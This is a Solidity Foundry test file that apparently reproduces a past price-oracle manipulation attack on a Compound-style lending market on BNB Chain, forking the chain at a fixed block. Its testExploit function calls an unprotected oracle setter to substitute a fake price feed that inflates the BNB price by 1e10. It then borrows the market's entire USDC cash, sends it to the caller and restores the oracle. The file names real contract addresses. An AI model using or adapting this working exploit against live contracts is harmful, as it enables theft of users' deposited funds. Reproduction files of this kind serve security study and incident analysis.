// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";

import {ICointroller} from "src/interfaces/ICointroller.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

import {IPriceFeed} from "src/interfaces/IPriceFeed.sol";
import {ISimplePriceOracle} from "src/interfaces/ISimplePriceOracle.sol";

interface IRToken {

    event AccrueInterest(uint256 cashPrior, uint256 interestAccumulated, uint256 borrowIndex, uint256 totalBorrows);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Borrow(address borrower, uint256 borrowAmount, uint256 accountBorrows, uint256 totalBorrows);
    event Failure(uint256 error, uint256 info, uint256 detail);
    event LiquidateBorrow(
        address liquidator, address borrower, uint256 repayAmount, address rTokenCollateral, uint256 seizeTokens
    );
    event Mint(address minter, uint256 mintAmount, uint256 mintTokens);
    event NewAdmin(address oldAdmin, address newAdmin);
    event NewCointroller(address oldCointroller, address newCointroller);
    event NewMarketInterestRateModel(address oldInterestRateModel, address newInterestRateModel);
    event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);
    event NewReserveFactor(uint256 oldReserveFactorMantissa, uint256 newReserveFactorMantissa);
    event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);
    event RepayBorrow(
        address payer, address borrower, uint256 repayAmount, uint256 accountBorrows, uint256 totalBorrows
    );
    event ReservesAdded(address benefactor, uint256 addAmount, uint256 newTotalReserves);
    event ReservesReduced(address admin, uint256 reduceAmount, uint256 newTotalReserves);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function _acceptAdmin() external returns (uint256);

    function _addReserves(uint256 addAmount) external returns (uint256);

    function _becomeImplementation(bytes memory data) external;

    function _reduceReserves(uint256 reduceAmount) external returns (uint256);

    function _resignImplementation() external;

    function _setCointroller(address newCointroller) external returns (uint256);

    function _setInterestRateModel(address newInterestRateModel) external returns (uint256);

    function _setPendingAdmin(address newPendingAdmin) external returns (uint256);

    function _setReserveFactor(uint256 newReserveFactorMantissa) external returns (uint256);

    function accrualBlockNumber() external view returns (uint256);

    function accrueInterest() external returns (uint256);

    function admin() external view returns (address);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function balanceOfUnderlying(address owner) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function borrowBalanceCurrent(address account) external returns (uint256);

    function borrowBalanceStored(address account) external view returns (uint256);

    function borrowIndex() external view returns (uint256);

    function borrowRatePerBlock() external view returns (uint256);

    function cointroller() external view returns (address);

    function decimals() external view returns (uint8);

    function exchangeRateCurrent() external returns (uint256);

    function exchangeRateStored() external view returns (uint256);

    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);

    function getCash() external view returns (uint256);

    function implementation() external view returns (address);

    function initialize(
        address underlying_,
        address cointroller_,
        address interestRateModel_,
        uint256 initialExchangeRateMantissa_,
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) external;

    function initialize(
        address cointroller_,
        address interestRateModel_,
        uint256 initialExchangeRateMantissa_,
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) external;

    function interestRateModel() external view returns (address);

    function isRToken() external view returns (bool);

    function liquidateBorrow(address borrower, uint256 repayAmount, address rTokenCollateral)
        external
        returns (uint256);

    function mint() external payable;

    function mint(uint256 mintAmount) external returns (uint256);

    function name() external view returns (string memory);

    function pendingAdmin() external view returns (address);

    function redeem(uint256 redeemTokens) external returns (uint256);

    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

    function repayBorrow(uint256 repayAmount) external returns (uint256);

    function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);

    function reserveFactorMantissa() external view returns (uint256);

    function seize(address liquidator, address borrower, uint256 seizeTokens) external returns (uint256);

    function supplyRatePerBlock() external view returns (uint256);

    function sweepToken(address token) external;

    function symbol() external view returns (string memory);

    function totalBorrows() external view returns (uint256);

    function totalBorrowsCurrent() external returns (uint256);

    function totalReserves() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address dst, uint256 amount) external returns (bool);

    function transferFrom(address src, address dst, uint256 amount) external returns (bool);

    function underlying() external view returns (address);

}

contract ContractTest is Test {

    IERC20 usdc = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IRToken rbnb = IRToken(0x157822aC5fa0Efe98daa4b0A55450f4a182C10cA);
    IRToken rusdc = IRToken(0x916e87d16B2F3E097B9A6375DC7393cf3B5C11f5);
    ICointroller cointroller = ICointroller(0x4f3e801Bd57dC3D641E72f2774280b21d31F64e4);
    ISimplePriceOracle simplePriceOracle = ISimplePriceOracle(0xD55f01B4B51B7F48912cD8Ca3CDD8070A1a9DBa5);
    IPriceFeed chainlinkBNBUSDPriceFeed = IPriceFeed(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE);

    function setUp() public {
        vm.createSelectFork("bsc", 16_956_474); //fork bsc at block 16956474
    }

    function testExploit() public {
        emit log_named_uint("Before exploit, USDC balance of attacker:", usdc.balanceOf(address(this)));
        rbnb.approve(address(cointroller), type(uint256).max);
        address[] memory rTokens = new address[](1);
        rTokens[0] = address(rbnb);
        cointroller.enterMarkets(rTokens);
        rbnb.mint{value: 100_000_000_000_000}();
        simplePriceOracle.setOracleData(address(rbnb), address(this));
        rusdc.borrow(rusdc.getCash());
        rusdc.transfer(msg.sender, rusdc.balanceOf(address(this)));
        simplePriceOracle.setOracleData(address(rbnb), address(chainlinkBNBUSDPriceFeed));
        emit log_named_uint("After exploit, USDC balance of attacker:", usdc.balanceOf(address(this)));
    }

    function decimals() external view returns (uint8) {
        return chainlinkBNBUSDPriceFeed.decimals();
    }

    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        (roundId, answer, startedAt, updatedAt, answeredInRound) = chainlinkBNBUSDPriceFeed.latestRoundData();
        answer = answer * 1e10;
    }

}
